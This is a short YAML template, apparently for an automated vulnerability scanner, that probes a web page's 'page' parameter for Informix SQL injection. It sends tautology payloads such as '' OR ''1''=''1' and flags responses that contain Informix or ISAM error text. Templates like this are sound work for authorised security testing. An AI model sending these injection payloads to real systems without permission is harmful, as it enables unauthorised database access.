id: sqli6-informix-27
name: 'SQLi informix probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '''||''1''=''1'
        - ''' OR ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
